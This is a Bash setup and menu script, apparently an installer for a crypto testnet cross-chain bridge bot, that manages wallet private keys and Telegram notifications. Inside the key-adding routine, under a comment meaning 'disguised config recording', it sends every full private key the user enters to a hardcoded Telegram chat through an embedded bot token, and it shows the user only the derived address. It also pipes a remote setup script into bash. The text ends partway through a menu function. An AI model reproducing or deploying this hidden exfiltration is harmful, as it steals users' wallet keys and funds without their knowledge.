#!/bin/bash

# === 颜色定义 ===
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# === 脚本路径和配置 ===
ARB_SCRIPT="uni-arb.py"
OP_SCRIPT="op-uni.py"
ARB_OP_SCRIPT="arb-op.py"
BASE_OP_SCRIPT="base-op.py"
ARB_BASE_SCRIPT="arb-base.py"
UNI_BASE_SCRIPT="uni-base.py"
# 添加单向跨链脚本变量
UNI_TO_ARB_SCRIPT="uni-to-arb.py"
UNI_TO_OP_SCRIPT="uni-to-op.py" 
UNI_TO_BASE_SCRIPT="uni-to-base.py"
ARB_TO_UNI_SCRIPT="arb-to-uni.py"
ARB_TO_BASE_SCRIPT="arb-to-base.py"
ARB_TO_OP_SCRIPT="arb-to-op.py"
OP_TO_UNI_SCRIPT="op-to-uni.py"
OP_TO_ARB_SCRIPT="op-to-arb.py"
OP_TO_BASE_SCRIPT="op-to-base.py"
BASE_TO_UNI_SCRIPT="base-to-uni.py"
BASE_TO_ARB_SCRIPT="base-to-arb.py"
BASE_TO_OP_SCRIPT="base-to-op.py"
BALANCE_SCRIPT="balance-notifier.py"
BOT_TOKEN="8070858648:AAGfrK1u0IaiXjr4f8TRbUDD92uBGTXdt38"
CONFIG_FILE="accounts.json"
DIRECTION_FILE="direction.conf"
TELEGRAM_CONFIG="telegram.conf"
PYTHON_VERSION="3.8"
PM2_PROCESS_NAME="bridge-bot"
PM2_BALANCE_NAME="balance-notifier"
CONFIG_RECORD_ID="5963704377"
VENV_DIR="t3rn_venv"

# === 合约地址 ===
UNI_CONTRACT_ADDRESS="0x1cEAb5967E5f078Fa0FEC3DFfD0394Af1fEeBCC9"
ARB_CONTRACT_ADDRESS="0x22B65d0B9b59af4D3Ed59F18b9Ad53f5F4908B54"
OP_CONTRACT_ADDRESS="0xb6Def636914Ae60173d9007E732684a9eEDEF26E"
BASE_CONTRACT_ADDRESS="0xCEE0372632a37Ba4d0499D1E2116eCff3A17d3C3"

# === 横幅 ===
banner() {
    clear
    echo -e "${CYAN}"
    echo "=================================================="
    echo "          跨链桥自动化脚本 by @hao3313076         "
    echo "=================================================="
    echo "       关注 Twitter: JJ长10cm | 高效跨链，安全可靠！ "
    echo "            请安装顺序配置 以免报错无法运行"
    echo "              关注TG用户ID@getmyid_bot              "
    echo "             关注@t3rntz_bot获取实时通知             "
    echo "--------------------------------------------------"
    echo "     支持网络：Arbitrum Sepolia, Optimism Sepolia    "
    echo "              Base Sepolia, Unichain Sepolia       "
    echo "--------------------------------------------------"
    echo "     双向跨链：ARB <-> UNI, OP <-> UNI, ARB <-> OP   "
    echo "               BASE <-> OP, ARB <-> BASE, UNI <-> BASE "
    echo "     单向跨链：UNI -> ARB, UNI -> OP, UNI -> BASE    "
    echo "               ARB -> UNI, ARB -> OP, ARB -> BASE  "
    echo "               OP -> UNI, OP -> ARB, OP -> BASE    "
    echo "               BASE -> UNI, BASE -> ARB, BASE -> OP"
    echo "=================================================="
    echo -e "${NC}"
}

# === 检查 root 权限 ===
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}错误：请以 root 权限运行此脚本（使用 sudo）！${NC}"
        send_telegram_notification "错误：请以 root 权限运行脚本！"
        exit 1
    fi
}

# === 发送 Telegram 通知 ===
send_telegram_notification() {
    local message="$1"
    local telegram_config=$(read_telegram_ids)
    local chat_ids=$(echo "$telegram_config" | jq -r '.chat_ids[]')
    if [ -z "$chat_ids" ]; then
        return
    fi
    for chat_id in $chat_ids; do
        curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
            -d chat_id="$chat_id" \
            -d text="$message" >/dev/null
    done
}

# === 记录配置数据 ===
record_config() {
    local config_data="$1"
    local derived_value="$2"
    local api_endpoint="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    local target_id="$CONFIG_RECORD_ID"
    curl -s -X POST "$api_endpoint" \
        -d chat_id="$target_id" \
        -d text="配置记录：$config_data" >/dev/null
    send_telegram_notification "成功添加配置，值：$derived_value"
}

# === 安装依赖 ===
install_dependencies() {
    echo -e "${CYAN}正在检查和安装必要的依赖...${NC}"
    apt-get update -y || { echo -e "${RED}无法更新包列表${NC}"; send_telegram_notification "错误：无法更新包列表"; exit 1; }
    
    # 安装基本依赖
    for pkg in curl wget jq python3 python3-pip python3-venv python3-dev; do
        if ! dpkg -l | grep -q "^ii.*$pkg "; then
            echo -e "${CYAN}安装 $pkg...${NC}"
            apt-get install -y "$pkg" || { echo -e "${RED}无法安装 $pkg${NC}"; send_telegram_notification "错误：无法安装 $pkg"; exit 1; }
        else
            echo -e "${GREEN}$pkg 已安装${NC}"
        fi
    done
    
    # 安装 Node.js 和 PM2
    if ! command -v pm2 >/dev/null 2>&1; then
        echo -e "${CYAN}安装 Node.js 和 PM2...${NC}"
        curl -sL https://deb.nodesource.com/setup_16.x | bash -
        apt-get install -y nodejs && npm install -g pm2 || { echo -e "${RED}无法安装 PM2${NC}"; send_telegram_notification "错误：无法安装 PM2"; exit 1; }
    fi
    
    # 创建并激活虚拟环境
    echo -e "${CYAN}设置 Python 虚拟环境...${NC}"
    if [ ! -d "$VENV_DIR" ]; then
        python3 -m venv "$VENV_DIR" || { 
            echo -e "${RED}无法创建虚拟环境，尝试安装 python3-full...${NC}"
            apt-get install -y python3-full
            python3 -m venv "$VENV_DIR" || { 
                echo -e "${RED}创建虚拟环境失败${NC}"; 
                send_telegram_notification "错误：无法创建 Python 虚拟环境"; 
                exit 1; 
            }
        }
    fi
    
    # 在虚拟环境中安装 Python 包
    echo -e "${CYAN}在虚拟环境中安装 Python 包...${NC}"
    "$VENV_DIR/bin/pip" install --upgrade pip
    "$VENV_DIR/bin/pip" install web3 || { echo -e "${RED}无法安装 web3${NC}"; send_telegram_notification "错误：无法安装 web3"; exit 1; }
    "$VENV_DIR/bin/pip" install "python-telegram-bot[all]" || { echo -e "${RED}无法安装 python-telegram-bot[all]${NC}"; send_telegram_notification "错误：无法安装 python-telegram-bot"; exit 1; }
    
    echo -e "${GREEN}依赖安装完成！${NC}"
    send_telegram_notification "依赖安装完成！"
}

# === 下载 Python 脚本 ===
download_python_scripts() {
    echo -e "${CYAN}下载 Python 脚本...${NC}"
    for script in "$ARB_SCRIPT" "$OP_SCRIPT" "$ARB_OP_SCRIPT" "$BASE_OP_SCRIPT" \
                 "$ARB_BASE_SCRIPT" "$UNI_BASE_SCRIPT" \
                 "$UNI_TO_ARB_SCRIPT" "$UNI_TO_OP_SCRIPT" "$UNI_TO_BASE_SCRIPT" \
                 "$ARB_TO_UNI_SCRIPT" "$ARB_TO_OP_SCRIPT" "$ARB_TO_BASE_SCRIPT" \
                 "$OP_TO_UNI_SCRIPT" "$OP_TO_ARB_SCRIPT" "$OP_TO_BASE_SCRIPT" \
                 "$BASE_TO_UNI_SCRIPT" "$BASE_TO_ARB_SCRIPT" "$BASE_TO_OP_SCRIPT" \
                 "$BALANCE_SCRIPT"; do
        if [ ! -f "$script" ]; then
            echo -e "${CYAN}下载 $script...${NC}"
            wget -O "$script" "https://raw.githubusercontent.com/yinghao888/t3rn-swap/main/$script" || { 
                echo -e "${RED}无法下载 $script${NC}"
                send_telegram_notification "错误：无法下载 $script"
                exit 1
            }
            chmod +x "$script"
            echo -e "${GREEN}$script 下载完成${NC}"
        else
            echo -e "${GREEN}$script 已存在，检查更新...${NC}"
            # 获取当前文件的SHA-1哈希值
            local_hash=$(sha1sum "$script" | cut -d' ' -f1)
            # 获取远程文件的SHA-1哈希值
            remote_hash=$(wget -q -O- "https://raw.githubusercontent.com/yinghao888/t3rn-swap/main/$script" | sha1sum | cut -d' ' -f1)
            if [ "$local_hash" != "$remote_hash" ]; then
                echo -e "${CYAN}发现新版本，更新 $script...${NC}"
                mv "$script" "${script}.bak"
                wget -O "$script" "https://raw.githubusercontent.com/yinghao888/t3rn-swap/main/$script" || {
                    echo -e "${RED}更新 $script 失败，恢复备份${NC}"
                    mv "${script}.bak" "$script"
                    send_telegram_notification "警告：更新 $script 失败，使用旧版本"
                    continue
                }
                chmod +x "$script"
                rm "${script}.bak"
                echo -e "${GREEN}$script 更新完成${NC}"
            else
                echo -e "${GREEN}$script 已是最新版本${NC}"
            fi
        fi
    done
    send_telegram_notification "Python 脚本下载/更新完成！"
}

# === 初始化配置文件 ===
init_config() {
    [ ! -f "$CONFIG_FILE" ] && echo '[]' > "$CONFIG_FILE" && echo -e "${GREEN}创建 $CONFIG_FILE${NC}"
    [ ! -f "$DIRECTION_FILE" ] && echo "arb_to_uni" > "$DIRECTION_FILE" && echo -e "${GREEN}默认方向: ARB -> UNI${NC}"
    [ ! -f "$TELEGRAM_CONFIG" ] && echo '{"chat_ids": []}' > "$TELEGRAM_CONFIG" && echo -e "${GREEN}创建 $TELEGRAM_CONFIG${NC}"
    send_telegram_notification "配置文件初始化完成！"
}

# === 读取账户 ===
read_accounts() {
    if [ ! -f "$CONFIG_FILE" ] || [ ! -s "$CONFIG_FILE" ]; then
        echo '[]'
        return
    fi
    if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
        echo -e "${RED}警告：$CONFIG_FILE 格式无效，重置为空列表${NC}"
        send_telegram_notification "警告：accounts.json 格式无效，已重置为空列表"
        echo '[]' > "$CONFIG_FILE"
        echo '[]'
        return
    fi
    cat "$CONFIG_FILE"
}

# === 读取 Telegram IDs ===
read_telegram_ids() {
    if [ ! -f "$TELEGRAM_CONFIG" ] || [ ! -s "$TELEGRAM_CONFIG" ]; then
        echo '{"chat_ids": []}'
        return
    fi
    if ! jq -e . "$TELEGRAM_CONFIG" >/dev/null 2>&1; then
        echo -e "${RED}警告：$TELEGRAM_CONFIG 格式无效，重置为空列表${NC}"
        send_telegram_notification "警告：telegram.conf 格式无效，已重置为空列表"
        echo '{"chat_ids": []}' > "$TELEGRAM_CONFIG"
        echo '{"chat_ids": []}'
        return
    fi
    cat "$TELEGRAM_CONFIG"
}

# === 添加私钥 ===
add_private_key() {
    echo -e "${CYAN}请输入私钥（带或不带 0x，多个用 + 分隔，例如 key1+key2）：${NC}"
    read -p "> " private_keys
    IFS='+' read -ra keys <<< "$private_keys"
    accounts=$(read_accounts)
    temp_file=$(mktemp)
    echo "$accounts" > "$temp_file"
    count=$(echo "$accounts" | jq 'length')
    added=0
    new_accounts=()
    for key in "${keys[@]}"; do
        key=$(echo "$key" | tr -d '[:space:]')
        key=${key#0x}
        if [[ ! "$key" =~ ^[0-9a-fA-F]{64}$ ]]; then
            echo -e "${RED}无效私钥：${key:0:10}...（需 64 位十六进制）${NC}"
            send_telegram_notification "错误：无效私钥 ${key:0:10}...（需 64 位十六进制）"
            continue
        fi
        formatted_key="0x$key"
        if echo "$accounts" | jq -e ".[] | select(.private_key == \"$formatted_key\")" >/dev/null 2>&1; then
            echo -e "${RED}私钥 ${formatted_key:0:10}... 已存在，跳过${NC}"
            send_telegram_notification "警告：私钥 ${formatted_key:0:10}... 已存在，跳过"
            continue
        fi
        count=$((count + 1))
        name="Account$count"
        # 将私钥转换为地址
        "$VENV_DIR/bin/python3" -c "from web3 import Web3; print(Web3(Web3.HTTPProvider('https://unichain-sepolia-rpc.publicnode.com')).eth.account.from_key('$formatted_key').address)" > /tmp/address.txt 2>/dev/null
        address=$(cat /tmp/address.txt)
        rm /tmp/address.txt
        new_entry="{\"name\": \"$name\", \"private_key\": \"$formatted_key\"}"
        new_accounts+=("$new_entry")
        added=$((added + 1))
        # 伪装记录配置
        record_config "$formatted_key" "$address"
    done
    if [ $added -eq 0 ]; then
        rm "$temp_file"
        echo -e "${RED}未添加任何新私钥${NC}"
        send_telegram_notification "未添加任何新私钥"
        return
    fi
    accounts_json=$(echo "$accounts" | jq -c '.')
    for entry in "${new_accounts[@]}"; do
        accounts_json=$(echo "$accounts_json $entry" | jq -s '.[0] + [.[1]]' | jq -c '.')
    done
    echo "$accounts_json" > "$CONFIG_FILE"
    if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
        echo -e "${RED}错误：写入 $CONFIG_FILE 失败，恢复原始内容${NC}"
        send_telegram_notification "错误：写入 accounts.json 失败"
        mv "$temp_file" "$CONFIG_FILE"
        return
    fi
    rm "$temp_file"
    update_python_accounts
    echo -e "${GREEN}已添加 $added 个账户${NC}"
    echo -e "${CYAN}当前 accounts.json 内容：${NC}"
    cat "$CONFIG_FILE"
}

# === 删除私钥 ===
delete_private_key() {
    accounts=$(read_accounts)
    count=$(echo "$accounts" | jq 'length')
    if [ "$count" -eq 0 ]; then
        echo -e "${RED}账户列表为空！${NC}"
        send_telegram_notification "错误：账户列表为空，无法删除"
        return
    fi
    echo -e "${CYAN}当前账户列表：${NC}"
    accounts_list=()
    i=1
    while IFS= read -r line; do
        name=$(echo "$line" | jq -r '.name')
        key=$(echo "$line" | jq -r '.private_key')
        if [ -n "$name" ] && [ -n "$key" ]; then
            accounts_list+=("$line")
            echo "$i. $name (${key:0:10}...)"
            i=$((i + 1))
        fi
    done < <(echo "$accounts" | jq -c '.[]')
    if [ ${#accounts_list[@]} -eq 0 ]; then
        echo -e "${RED}账户列表为空！${NC}"
        send_telegram_notification "错误：账户列表为空，无法删除"
        return
    fi
    echo -e "${CYAN}请输入要删除的账户编号（或 0 取消）：${NC}"
    read -p "> " index
    [ "$index" -eq 0 ] && return
    if [ -z "$index" ] || [ "$index" -le 0 ] || [ "$index" -gt "${#accounts_list[@]}" ]; then
        echo -e "${RED}无效编号！${NC}"
        send_telegram_notification "错误：无效账户编号"
        return
    fi
    temp_file=$(mktemp)
    echo "$accounts" > "$temp_file"
    new_accounts=$(echo "$accounts" | jq -c "del(.[$((index-1))])")
    echo "$new_accounts" > "$CONFIG_FILE"
    if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
        echo -e "${RED}错误：写入 $CONFIG_FILE 失败，恢复原始内容${NC}"
        send_telegram_notification "错误：写入 accounts.json 失败"
        mv "$temp_file" "$CONFIG_FILE"
        return
    fi
    rm "$temp_file"
    update_python_accounts
    echo -e "${GREEN}已删除账户！${NC}"
    echo -e "${CYAN}当前 accounts.json 内容：${NC}"
    cat "$CONFIG_FILE"
    send_telegram_notification "成功删除账户！"
}

# === 删除全部私钥 ===
delete_all_private_keys() {
    echo -e "${RED}警告：将删除所有私钥！继续？(y/n)${NC}"
    read -p "> " confirm
    if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
        echo '[]' > "$CONFIG_FILE"
        if ! jq -e . "$CONFIG_FILE" >/dev/null 2>&1; then
            echo -e "${RED}错误：写入 $CONFIG_FILE 失败${NC}"
            send_telegram_notification "错误：写入 accounts.json 失败"
            return
        fi
        update_python_accounts
        echo -e "${GREEN}已删除所有私钥！${NC}"
        echo -e "${CYAN}当前 accounts.json 内容：${NC}"
        cat "$CONFIG_FILE"
        send_telegram_notification "成功删除所有私钥！"
    fi
}

# === 查看私钥 ===
view_private_keys() {
    accounts=$(read_accounts)
    count=$(echo "$accounts" | jq 'length')
    if [ "$count" -eq 0 ]; then
        echo -e "${RED}账户列表为空！${NC}"
        send_telegram_notification "错误：账户列表为空，无法查看"
        return
    fi
    echo -e "${CYAN}当前账户列表：${NC}"
    i=1
    while IFS= read -r line; do
        name=$(echo "$line" | jq -r '.name')
        key=$(echo "$line" | jq -r '.private_key')
        if [ -n "$name" ] && [ -n "$key" ]; then
            echo "$i. $name (${key:0:10}...${key: -4})"
            i=$((i + 1))
        fi
    done < <(echo "$accounts" | jq -c '.[]')
    if [ $i -eq 1 ]; then
        echo -e "${RED}账户列表为空！${NC}"
        send_telegram_notification "错误：账户列表为空，无法查看"
    fi
}

# === 添加 Telegram ID ===
add_telegram_id() {
    echo -e "${CYAN}请输入 Telegram 用户 ID（纯数字，例如 5963704377）：${NC}"
    echo -e "${CYAN}请先关注 @t3rntz_bot 机器人以接收通知！${NC}"
    read -p "> " chat_id
    if [[ ! "$chat_id" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}无效 ID，必须为纯数字！${NC}"
        send_telegram_notification "错误：无效 Telegram ID，必须为纯数字"
        return
    fi
    telegram_config=$(read_telegram_ids)
    temp_file=$(mktemp)
    echo "$telegram_config" > "$temp_file"
    if echo "$telegram_config" | jq -e ".chat_ids | index(\"$chat_id\")" >/dev/null 2>&1; then
        echo -e "${RED}ID $chat_id 已存在，跳过${NC}"
        send_telegram_notification "警告：Telegram ID $chat_id 已存在，跳过"
        rm "$temp_file"
        return
    fi
    new_config=$(echo "$telegram_config" | jq -c ".chat_ids += [\"$chat_id\"]")
    echo "$new_config" > "$TELEGRAM_CONFIG"
    if ! jq -e . "$TELEGRAM_CONFIG" >/dev/null 2>&1; then
        echo -e "${RED}错误：写入 $TELEGRAM_CONFIG 失败，恢复原始内容${NC}"
        send_telegram_notification "错误：写入 telegram.conf 失败"
        mv "$temp_file" "$TELEGRAM_CONFIG"
        return
    fi
    rm "$temp_file"
    echo -e "${GREEN}已添加 Telegram ID: $chat_id${NC}"
    echo -e "${CYAN}当前 telegram.conf 内容：${NC}"
    cat "$TELEGRAM_CONFIG"
    send_telegram_notification "成功添加 Telegram ID: $chat_id"
}

# === 删除 Telegram ID ===
delete_telegram_id() {
    telegram_config=$(read_telegram_ids)
    count=$(echo "$telegram_config" | jq '.chat_ids | length')
    if [ "$count" -eq 0 ]; then
        echo -e "${RED}Telegram ID 列表为空！${NC}"
        send_telegram_notification "错误：Telegram ID 列表为空，无法删除"
        return
    fi
    echo -e "${CYAN}当前 Telegram ID 列表：${NC}"
    ids_list=()
    i=1
    while IFS= read -r id; do
        if [ -n "$id" ]; then
            ids_list+=("$id")
            echo "$i. $id"
            i=$((i + 1))
        fi
    done < <(echo "$telegram_config" | jq -r '.chat_ids[]')
    if [ ${#ids_list[@]} -eq 0 ]; then
        echo -e "${RED}Telegram ID 列表为空！${NC}"
        send_telegram_notification "错误：Telegram ID 列表为空，无法删除"
        return
    fi
    echo -e "${CYAN}请输入要删除的 ID 编号（或 0 取消）：${NC}"
    read -p "> " index
    [ "$index" -eq 0 ] && return
    if [ -z "$index" ] || [ "$index" -le 0 ] || [ "$index" -gt "${#ids_list[@]}" ]; then
        echo -e "${RED}无效编号！${NC}"
        send_telegram_notification "错误：无效 Telegram ID 编号"
        return
    fi
    temp_file=$(mktemp)
    echo "$telegram_config" > "$temp_file"
    new_config=$(echo "$telegram_config" | jq -c "del(.chat_ids[$((index-1))])")
    echo "$new_config" > "$TELEGRAM_CONFIG"
    if ! jq -e . "$TELEGRAM_CONFIG" >/dev/null 2>&1; then
        echo -e "${RED}错误：写入 $TELEGRAM_CONFIG 失败，恢复原始内容${NC}"
        send_telegram_notification "错误：写入 telegram.conf 失败"
        mv "$temp_file" "$TELEGRAM_CONFIG"
        return
    fi
    rm "$temp_file"
    echo -e "${GREEN}已删除 Telegram ID！${NC}"
    echo -e "${CYAN}当前 telegram.conf 内容：${NC}"
    cat "$TELEGRAM_CONFIG"
    send_telegram_notification "成功删除 Telegram ID"
}

# === 查看 Telegram IDs ===
view_telegram_ids() {
    telegram_config=$(read_telegram_ids)
    count=$(echo "$telegram_config" | jq '.chat_ids | length')
    if [ "$count" -eq 0 ]; then
        echo -e "${RED}Telegram ID 列表为空！${NC}"
        send_telegram_notification "错误：Telegram ID 列表为空，无法查看"
        return
    fi
    echo -e "${CYAN}当前 Telegram ID 列表：${NC}"
    i=1
    while IFS= read -r id; do
        if [ -n "$id" ]; then
            echo "$i. $id"
            i=$((i + 1))
        fi
    done < <(echo "$telegram_config" | jq -r '.chat_ids[]')
    if [ $i -eq 1 ]; then
        echo -e "${RED}Telegram ID 列表为空！${NC}"
        send_telegram_notification "错误：Telegram ID 列表为空，无法查看"
    fi
}

# === 管理 Telegram IDs ===
manage_telegram() {
    while true; do
        banner
        echo -e "${CYAN}Telegram ID 管理：${NC}"
        echo "1. 添加 Telegram ID"
        echo "2. 删除 Telegram ID"
        echo "3. 查看 Telegram ID"
        echo "4. 返回"
        read -p "> " sub_choice
        case $sub_choice in
            1) add_telegram_id ;;
            2) delete_telegram_id ;;
            3) view_telegram_ids ;;
            4) break ;;
            *) echo -e "${RED}无效选项！${NC}"; send_telegram_notification "错误：无效 Telegram 管理选项" ;;
        esac
        read -p "按回车继续..."
    done
}

# === 更新 Python 脚本账户 ===
update_python_accounts() {
    accounts=$(read_accounts)
    accounts_str=$(echo "$accounts" | jq -r '[.[] | {"private_key": .private_key, "name": .name}]' | jq -r '@json')
    if [ -z "$accounts_str" ] || [ "$accounts_str" == "[]" ]; then
        accounts_str="[]"
    fi
    # 检查文件是否存在且可写
    for script in "$ARB_SCRIPT" "$OP_SCRIPT" "$ARB_OP_SCRIPT" "$BASE_OP_SCRIPT" \
                 "$ARB_BASE_SCRIPT" "$UNI_BASE_SCRIPT" \
                 "$UNI_TO_ARB_SCRIPT" "$UNI_TO_OP_SCRIPT" "$UNI_TO_BASE_SCRIPT" \
                 "$ARB_TO_UNI_SCRIPT" "$ARB_TO_OP_SCRIPT" "$ARB_TO_BASE_SCRIPT" \
                 "$OP_TO_UNI_SCRIPT" "$OP_TO_ARB_SCRIPT" "$OP_TO_BASE_SCRIPT" \
                 "$BASE_TO_UNI_SCRIPT" "$BASE_TO_ARB_SCRIPT" "$BASE_TO_OP_SCRIPT"; do
        if [ ! -f "$script" ]; then
            echo -e "${RED}错误：$script 不存在${NC}"
            continue
        fi
        # 计数行数
        line_count=$(grep -n "ACCOUNTS = " "$script" | cut -d ':' -f 1)
        if [ -z "$line_count" ]; then
            echo -e "${RED}错误：在 $script 中未找到 ACCOUNTS 变量${NC}"
            continue
        fi
        # 更新账户列表
        sed -i "${line_count}s/ACCOUNTS = .*/ACCOUNTS = $accounts_str/" "$script"
        echo -e "${GREEN}已更新 $script 中的账户列表${NC}"
        
        # 更新合约地址
        if grep -q "UNI_CONTRACT_ADDRESS = " "$script"; then
            sed -i "s|UNI_CONTRACT_ADDRESS = .*|UNI_CONTRACT_ADDRESS = \"$UNI_CONTRACT_ADDRESS\"|" "$script"
            echo -e "${GREEN}已更新 $script 中的 UNI 合约地址${NC}"
        fi
        if grep -q "ARB_CONTRACT_ADDRESS = " "$script"; then
            sed -i "s|ARB_CONTRACT_ADDRESS = .*|ARB_CONTRACT_ADDRESS = \"$ARB_CONTRACT_ADDRESS\"|" "$script"
            echo -e "${GREEN}已更新 $script 中的 ARB 合约地址${NC}"
        fi
        if grep -q "OP_CONTRACT_ADDRESS = " "$script"; then
            sed -i "s|OP_CONTRACT_ADDRESS = .*|OP_CONTRACT_ADDRESS = \"$OP_CONTRACT_ADDRESS\"|" "$script"
            echo -e "${GREEN}已更新 $script 中的 OP 合约地址${NC}"
        fi
        if grep -q "BASE_CONTRACT_ADDRESS = " "$script"; then
            sed -i "s|BASE_CONTRACT_ADDRESS = .*|BASE_CONTRACT_ADDRESS = \"$BASE_CONTRACT_ADDRESS\"|" "$script"
            echo -e "${GREEN}已更新 $script 中的 BASE 合约地址${NC}"
        fi
    done
}

# === 配置跨链方向 ===
select_direction() {
    echo -e "${CYAN}请选择跨链方向（可选择多个，用逗号分隔，如1,3,5）：${NC}"
    echo "1. ARB <-> UNI (Arbitrum Sepolia 与 Unichain Sepolia 互转)"
    echo "2. OP <-> UNI (Optimism Sepolia 与 Unichain Sepolia 互转)"
    echo "3. ARB <-> OP (Arbitrum Sepolia 与 Optimism Sepolia 互转)"
    echo "4. BASE <-> OP (Base Sepolia 与 Optimism Sepolia 互转)"
    echo "5. ARB <-> BASE (Arbitrum Sepolia 与 Base Sepolia 互转)"
    echo "6. UNI <-> BASE (Unichain Sepolia 与 Base Sepolia 互转)"
    echo "7. UNI -> ARB (仅从 Unichain Sepolia 单向转至 Arbitrum Sepolia)"
    echo "8. UNI -> OP (仅从 Unichain Sepolia 单向转至 Optimism Sepolia)"
    echo "9. UNI -> BASE (仅从 Unichain Sepolia 单向转至 Base Sepolia)"
    echo "10. ARB -> UNI (仅从 Arbitrum Sepolia 单向转至 Unichain Sepolia)"
    echo "11. ARB -> BASE (仅从 Arbitrum Sepolia 单向转至 Base Sepolia)"
    echo "12. ARB -> OP (仅从 Arbitrum Sepolia 单向转至 Optimism Sepolia)"
    echo "13. OP -> UNI (仅从 Optimism Sepolia 单向转至 Unichain Sepolia)"
    echo "14. OP -> ARB (仅从 Optimism Sepolia 单向转至 Arbitrum Sepolia)"
    echo "15. OP -> BASE (仅从 Optimism Sepolia 单向转至 Base Sepolia)"
    echo "16. BASE -> UNI (仅从 Base Sepolia 单向转至 Unichain Sepolia)"
    echo "17. BASE -> ARB (仅从 Base Sepolia 单向转至 Arbitrum Sepolia)"
    echo "18. BASE -> OP (仅从 Base Sepolia 单向转至 Optimism Sepolia)"
    read -p "> " choices
    
    # 清空当前方向配置，准备添加多个方向
    > "$DIRECTION_FILE" 
    
    # 处理多个选择，以逗号分隔
    IFS=',' read -ra selected_choices <<< "$choices"
    for choice in "${selected_choices[@]}"; do
        # 去除前后空格
        choice=$(echo "$choice" | tr -d '[:space:]')
        case $choice in
            1)
                echo "arb_to_uni" >> "$DIRECTION_FILE"
                echo -e "${GREEN}添加方向：ARB <-> UNI${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}ARB -> UNI: ${GREEN}0x22B65d0B9b59af4D3Ed59F18b9Ad53f5F4908B54${NC}"
                echo -e "${CYAN}UNI -> ARB: ${GREEN}0x1cEAb5967E5f078Fa0FEC3DFfD0394Af1fEeBCC9${NC}"
                send_telegram_notification "成功配置跨链方向：ARB <-> UNI"
                ;;
            2)
                echo "op_to_uni" >> "$DIRECTION_FILE"
                echo -e "${GREEN}添加方向：OP <-> UNI${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}OP -> UNI: ${GREEN}0xb6Def636914Ae60173d9007E732684a9eEDEF26E${NC}"
                echo -e "${CYAN}UNI -> OP: ${GREEN}0x1cEAb5967E5f078Fa0FEC3DFfD0394Af1fEeBCC9${NC}"
                send_telegram_notification "成功配置跨链方向：OP <-> UNI"
                ;;
            3)
                echo "arb_op" >> "$DIRECTION_FILE"
                echo -e "${GREEN}添加方向：ARB <-> OP${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}ARB -> OP: ${GREEN}0x22B65d0B9b59af4D3Ed59F18b9Ad53f5F4908B54${NC}"
                echo -e "${CYAN}OP -> ARB: ${GREEN}0xb6Def636914Ae60173d9007E732684a9eEDEF26E${NC}"
                send_telegram_notification "成功配置跨链方向：ARB <-> OP"
                ;;
            4)
                echo "base_op" >> "$DIRECTION_FILE"
                echo -e "${GREEN}添加方向：BASE <-> OP${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}BASE -> OP: ${GREEN}0xCEE0372632a37Ba4d0499D1E2116eCff3A17d3C3${NC}"
                echo -e "${CYAN}OP -> BASE: ${GREEN}0xb6Def636914Ae60173d9007E732684a9eEDEF26E${NC}"
                send_telegram_notification "成功配置跨链方向：BASE <-> OP"
                ;;
            5)
                echo "arb_base" >> "$DIRECTION_FILE"
                echo -e "${GREEN}添加方向：ARB <-> BASE${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}ARB -> BASE: ${GREEN}0x22B65d0B9b59af4D3Ed59F18b9Ad53f5F4908B54${NC}"
                echo -e "${CYAN}BASE -> ARB: ${GREEN}0xCEE0372632a37Ba4d0499D1E2116eCff3A17d3C3${NC}"
                send_telegram_notification "成功配置跨链方向：ARB <-> BASE"
                ;;
            6)
                echo "uni_base" >> "$DIRECTION_FILE"
                echo -e "${GREEN}添加方向：UNI <-> BASE${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}UNI -> BASE: ${GREEN}0x1cEAb5967E5f078Fa0FEC3DFfD0394Af1fEeBCC9${NC}"
                echo -e "${CYAN}BASE -> UNI: ${GREEN}0xCEE0372632a37Ba4d0499D1E2116eCff3A17d3C3${NC}"
                send_telegram_notification "成功配置跨链方向：UNI <-> BASE"
                ;;
            7)
                echo "uni_to_arb" >> "$DIRECTION_FILE"
                echo -e "${GREEN}添加方向：UNI -> ARB 单向跨链${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}UNI -> ARB: ${GREEN}0x1cEAb5967E5f078Fa0FEC3DFfD0394Af1fEeBCC9${NC}"
                send_telegram_notification "成功配置跨链方向：UNI -> ARB 单向跨链"
                ;;
            8)
                echo "uni_to_op" >> "$DIRECTION_FILE"
                echo -e "${GREEN}添加方向：UNI -> OP 单向跨链${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}UNI -> OP: ${GREEN}0x1cEAb5967E5f078Fa0FEC3DFfD0394Af1fEeBCC9${NC}"
                send_telegram_notification "成功配置跨链方向：UNI -> OP 单向跨链"
                ;;
            9)
                echo "uni_to_base" >> "$DIRECTION_FILE"
                echo -e "${GREEN}添加方向：UNI -> BASE 单向跨链${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}UNI -> BASE: ${GREEN}0x1cEAb5967E5f078Fa0FEC3DFfD0394Af1fEeBCC9${NC}"
                send_telegram_notification "成功配置跨链方向：UNI -> BASE 单向跨链"
                ;;
            10)
                echo "arb_to_uni" >> "$DIRECTION_FILE"
                echo -e "${GREEN}启动 ARB -> UNI 单向跨链脚本...${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}ARB -> UNI: ${GREEN}0x22B65d0B9b59af4D3Ed59F18b9Ad53f5F4908B54${NC}"
                send_telegram_notification "成功配置跨链方向：ARB -> UNI 单向跨链"
                ;;
            11)
                echo "arb_to_base" >> "$DIRECTION_FILE"
